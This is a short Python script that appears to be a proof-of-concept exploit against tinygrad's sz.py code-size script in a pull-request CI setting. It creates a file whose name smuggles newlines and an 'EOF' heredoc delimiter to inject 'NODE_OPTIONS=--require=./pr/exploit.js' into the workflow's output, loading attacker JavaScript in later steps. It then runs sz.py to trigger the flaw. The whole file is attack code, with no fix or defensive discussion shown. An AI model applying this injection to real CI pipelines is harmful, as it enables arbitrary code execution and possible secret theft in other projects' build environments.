import os
import subprocess
from pathlib import Path

# Setup directories
Path("base").mkdir(exist_ok=True)
Path("pr/tinygrad").mkdir(parents=True, exist_ok=True)

# Copy trusted sz.py to base
import shutil
shutil.copy("sz.py", "base/sz.py")

# Create malicious file in PR
malicious_name = 'pwn.py\nEOF\nNODE_OPTIONS=--require=./pr/exploit.js\nloc_content<<EOF\n.py'
malicious_path = Path("pr/tinygrad") / malicious_name
malicious_path.write_text("print('pwned')")

# Run sz.py
result = subprocess.run(["python3", "base/sz.py", "base", "pr"], capture_output=True, text=True)
print(result.stdout)
